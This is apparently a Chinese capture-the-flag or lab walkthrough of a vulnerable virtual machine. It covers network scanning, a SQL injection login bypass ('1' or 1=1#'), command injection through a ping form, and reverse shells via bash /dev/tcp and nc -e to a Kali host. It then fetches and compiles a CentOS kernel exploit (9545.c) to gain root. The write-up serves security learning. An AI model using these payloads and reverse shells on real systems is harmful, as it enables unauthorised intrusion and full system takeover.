1.先记得把.vmx文件的networkname改成nat模式，然后在虚拟机改成nat模式，然后使用VMware打开后点击我已移动该虚拟机，这个时候又被改成nat模式，然后我们这时候在改回来就会处于nat模式了
​
完整教程：
1.首先使用nmap 192.168.89.0/24 -sP 扫描网段存活的主机
MAC Address: 00:50:56:F7:76:F0 (VMware)
Nmap scan report for 192.168.89.136
​
2.扫端口
nmap -p- 192.168.89.136
PORT     STATE SERVICE
22/tcp   open  ssh
80/tcp   open  http
111/tcp  open  rpcbind
443/tcp  open  https
610/tcp  open  npmp-local
631/tcp  open  ipp
3306/tcp open  mysql
​
3.查看主机的80端口的web页面 发现存在登录界面 这里可以尝试使用web爆破或者sql注入进行测试
该靶机直接使用万能注入就可以成功登录 1' or 1=1# ,然后就进入了一个ping 的命令执行页面，这时候就可以想到可以拼接命令进行命令执行 127.0.0.1;whoami 等等,然后这里的话就是直接可以进行命令执行，相当于获得普通用户Apache的权限，然后这里可以用bash -i >&/dev/tcp/192.168.89.134/12228 0>&1把shell反弹到kali主机，kali开启nc -lvvp 12228监听就可以成功把shell反弹到kali。
4.提权
这里提权主要用到的还是linux内核漏洞，从-A的扫描可以知道靶机版本是linux 2.6，且是centos 系统，那么使用searchexpolit linux 2.6
centos,然后就搜索出
Linux Kernel 2.4.x/2.6.x (CentOS 4.8/5.3 / RHEL 4.8/5 | linux/local/9545.c
，用第一个（不知道为啥，可能尝试出来的吧），然后这里使用locate 定位这个脚本所在的位置，然后就开启80端口，接着靶机使用wget 192.168.89.134/9545.c把文件传过去，然后编译，执行后就能成功拿到root权限，在反弹shell一下就行了
​
反弹shell
```bash
nc 192.168.89.134 12222 -e /bin/bash
bash -i >&/dev/tcp/192.168.89.134/12222 0>&1
```
